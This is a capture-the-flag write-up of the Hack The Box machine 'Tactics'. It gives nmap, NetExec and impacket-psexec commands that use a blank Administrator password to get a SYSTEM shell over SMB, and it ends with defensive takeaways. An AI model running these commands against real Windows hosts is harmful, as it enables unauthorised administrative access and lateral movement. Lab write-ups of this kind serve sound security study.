# Tactics

| | |
|---|---|
| **Platform** | Hack The Box (Starting Point, Tier 1) |
| **OS** | Windows |
| **Difficulty** | Very Easy |
| **Techniques** | Blank Administrator password, NetExec validation, Impacket psexec (SYSTEM) |

## Overview
A Windows host where the Administrator account has a blank password, giving a SYSTEM
shell via Impacket. The canonical "valid admin credential -> SYSTEM" move.

## Enumeration
```bash
nmap -p- --min-rate 1000 <TARGET_IP>
nmap -sC -sV -p 135,139,445 <TARGET_IP>     # 135/139/445 = Windows + SMB
# validate the credential BEFORE trying to get a shell:
nxc smb <TARGET_IP> -u administrator -p ''  # [+] / (Pwn3d!) confirms admin
```

## Exploitation
```bash
impacket-psexec administrator@<TARGET_IP>   # blank password -> press Enter
# -> C:\Windows\system32>  as NT AUTHORITY\SYSTEM
```
With admin creds, `C$` also maps the whole drive over SMB.

## Key Takeaway
Never leave blank/default admin passwords. Restrict SMB exposure and monitor for
psexec-style service creation and admin logons.

## My note
Validating creds with `nxc smb ... -p ''` before launching a shell is a habit worth
keeping: it confirms the credential and your typing in one step. "Valid admin
credential -> Impacket -> SYSTEM shell" is exactly how lateral movement works in real
Windows/AD compromise, which is why this easy box matters for the OSCP AD set.
